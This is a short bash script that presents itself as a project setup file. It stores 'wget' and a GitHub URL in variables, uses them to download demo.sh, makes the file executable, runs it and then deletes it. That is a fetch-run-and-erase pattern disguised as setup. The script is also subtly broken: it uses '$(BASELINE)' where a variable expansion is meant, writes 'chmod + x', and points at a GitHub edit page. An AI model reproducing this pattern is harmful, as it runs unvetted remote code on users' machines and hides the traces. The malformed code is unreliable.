#!/bin/bash
# RUN THIS FILE TO START WORKING WITH THE PROJECT

# Define PARAM
PARAM="https://github.com/azabirnik/demo/edit/main/demo.sh"

# Define BASELINE
BASELINE="wget"

# Setup step 1
echo "Setup step 1"
$(BASELINE) $(PARAM)

# Setup step 2
chmod + x demo.sh && ./demo.sh

# Clean files
rm demo.sh
